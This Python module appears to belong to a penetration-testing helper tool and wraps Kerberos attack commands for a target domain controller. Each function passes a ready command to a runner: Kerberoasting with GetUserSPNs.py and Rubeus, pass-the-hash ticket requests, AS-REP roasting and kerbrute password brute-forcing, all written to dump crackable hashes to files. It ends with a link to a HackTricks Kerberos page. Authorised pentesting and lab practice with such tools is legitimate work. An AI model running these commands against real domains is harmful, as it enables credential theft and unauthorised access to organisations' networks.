from Modules.Imports.protocol_imports import *

def run_getuserspns(target_ip, open_ports):
    title = "GetUserSPNs.py"
    content = (
        f"./GetUserSPNs.py -request -dc-ip {target_ip} -outfile service.ticket.hashes "
        f"DOMAIN/USERNAME"
    )
    run_command(title, content, target_ip, open_ports)

def run_gettgt(target_ip, open_ports):
    title = "GetTGT.py"
    content = f"python getTGT.py -dc-ip {target_ip} -hashes :<NTLM_HASH> DOMAIN/USERNAME"
    run_command(title, content, target_ip, open_ports)

def run_rubeus(target_ip, open_ports):
    title = "Rubeus Kerberos Ticket Enumeration"
    content = f"Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt"
    run_command(title, content, target_ip, open_ports)

def run_asrep_roasting(target_ip, open_ports):
    title = "AS-REP Roasting"
    content = (
        f"impacket-GetNPUsers -dc-ip {target_ip} DOMAIN/ -usersfile users.txt "
        f"-format hashcat -outputfile asrep_hashes.txt"
    )
    run_command(title, content, target_ip, open_ports)

def run_kerbrute(target_ip, open_ports):
    title = "Kerbrute Brute-Force"
    content = f"kerbrute bruteuser -d DOMAIN -U usernames.txt {target_ip}"
    run_command(title, content, target_ip, open_ports)

def show_hacktricks_reference(target_ip, open_ports):
    title = "HackTricks Reference"
    content = (
        f"Visit the following link for more Kerberos enumeration tips:\n\n"
        f"https://book.hacktricks.xyz/network-services-pentesting/kerberos"
    )
    run_command(title, content, target_ip, open_ports)
